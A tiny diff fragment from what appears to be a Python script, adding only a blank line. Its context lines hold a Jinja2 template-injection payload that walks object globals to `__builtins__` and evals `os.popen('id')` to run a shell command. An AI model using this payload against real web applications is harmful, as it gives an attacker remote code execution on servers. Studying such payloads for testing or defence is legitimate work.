@@ -29,3 +29,4 @@ if __name__ == "__main__":
 		{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
 	{% endif %}
 {% endfor %}
+
